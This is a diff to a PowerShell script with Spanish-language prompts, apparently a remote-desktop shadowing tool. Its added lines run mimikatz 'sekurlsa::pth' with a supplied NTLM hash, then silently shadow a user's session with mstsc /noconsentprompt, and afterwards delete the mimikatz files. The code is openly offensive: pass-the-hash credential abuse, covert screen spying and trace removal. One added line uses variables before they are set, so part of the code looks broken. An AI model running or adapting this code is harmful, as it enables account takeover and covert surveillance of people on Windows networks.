@@ -82,7 +82,8 @@ function EnableTLS {
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
-	Write-Host ""
+	$mimikatz = "true"
+        Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
         if($hash -like 's*') { 
@@ -151,7 +152,7 @@ function EnableTLS {
    $Host.UI.RawUI.ForegroundColor = 'Gray'
    if(Test-Path variable:PassTheHash) { $powershell = '"$RDP = New-PSSession -Computer $computer -Authentication Kerberos"'
    $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $powershell' exit"
-   powershell $mimipath\mimikatz.exe $cmd ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" ; Write-Host ""}
+   powershell $mimipath\mimikatz.exe $cmd ; Write-Host ""}
    else { Write-Host ""
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
    $RDP = New-PSSession -Computer $computer -credential $credential }
@@ -244,7 +245,10 @@ function EnableTLS {
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500
+    $mimipwn = "mstsc /v $computer $admin /shadow:$shadow /noconsentprompt $prompt /f"
     if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" ; $prompt = $null } else { $admin = "/admin" ; $prompt = "/prompt" }
+    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
+    if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     if($control -eq 'true') { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt $prompt /f }
     else { mstsc /v $computer /$admin /shadow:$shadow /noconsentprompt $prompt /f }}
 
